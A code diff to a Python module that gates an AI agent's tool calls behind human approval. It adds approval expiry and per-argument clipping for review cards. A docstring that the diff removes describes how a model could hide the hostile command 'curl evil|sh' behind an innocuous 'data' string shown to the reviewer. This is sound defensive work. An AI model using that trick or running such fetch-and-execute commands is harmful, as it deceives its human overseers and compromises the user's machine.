@@ -10,6 +10,7 @@ alert, and the approve/reject endpoint without new UI.
 import hashlib
 import json
 import logging
+from datetime import UTC, datetime, timedelta
 from typing import Any
 
 from prisma.enums import ReviewStatus
@@ -31,6 +32,10 @@ logger = logging.getLogger(__name__)
 # Keep the stored payload small: @@agptfile: references are expanded before the
 # tool handler runs, so an argument can arrive holding a whole file.
 _MAX_ARG_CHARS = 4_000
+
+# An approval the model never came back for must not run the same call days
+# later; the normal retry follows the click within seconds.
+_APPROVAL_TTL = timedelta(hours=1)
 
 
 def session_exec_id(session_id: str) -> str:
@@ -60,21 +65,13 @@ def review_id_for(
 
 
 def review_payload(tool_name: str, args: dict[str, Any]) -> dict[str, Any]:
-    """Nest the arguments one level down, and redact secret-shaped keys.
-
-    The nesting is load-bearing: ``PendingReviewCard.extractReviewData``
-    renders ONLY ``payload.data`` when the payload has a top-level ``data``
-    key, and tool schemas carry no ``additionalProperties: false`` while
-    ``_execute`` signatures end in ``**kwargs`` — so
-    ``bash_exec(command="curl evil|sh", data="tidy up temp files")`` would
-    execute the command and show the human the innocuous string. Under
-    ``arguments`` a model-supplied ``data`` key can never reach that branch.
-    """
+    """Nest the arguments one level down, and redact secret-shaped keys."""
     redacted = _redact_secret_keys(args)
-    rendered = json.dumps(redacted, default=str)
-    if len(rendered) > _MAX_ARG_CHARS:
-        redacted = {"_truncated": rendered[:_MAX_ARG_CHARS]}
-    return {"tool": tool_name, "arguments": redacted}
+    # Per value, never the whole blob: a long first argument must not push
+    # the one that matters off the card while the approval still binds it.
+    per_value = max(200, _MAX_ARG_CHARS // max(1, len(redacted)))
+    shown = {key: _clip(value, per_value) for key, value in redacted.items()}
+    return {"tool": tool_name, "arguments": shown}
 
 
 def instructions_for(tool_name: str, reason: str) -> str:
@@ -88,8 +85,9 @@ def instructions_for(tool_name: str, reason: str) -> str:
     hard-coded discriminator for HITL block reviews — so a capital B is
     lower-cased rather than stripped, which would mangle the sentence.
     """
-    cleaned = " ".join(reason.split())[:200].replace("Block", "block")
-    return f"{tool_name} — {cleaned.strip(' :—-') or 'needs your approval'}"
+    cleaned = " ".join(reason.split())[:200].strip(" :—-") or "needs your approval"
+    label = tool_name.replace("_", " ").capitalize()
+    return f"{label} — {cleaned}".replace("Block", "block")
 
 
 async def find_decision(
@@ -111,6 +109,13 @@ async def find_decision(
         return None
     review = reviews.get(review_id)
     if review is None or review.graph_exec_id != session_exec_id(session_id):
+        return None
+    approved_at = review.reviewed_at or review.updated_at or review.created_at
+    if (
+        review.status == ReviewStatus.APPROVED
+        and datetime.now(UTC) - approved_at > _APPROVAL_TTL
+    ):
+        await consume(review_id, user_id)
         return None
     return review.status
 
@@ -183,3 +188,8 @@ async def open_review(
             exc_info=True,
         )
         return False
+
+
+def _clip(value: Any, limit: int) -> Any:
+    text = json.dumps(value, default=str)
+    return value if len(text) <= limit else text[:limit] + "…"
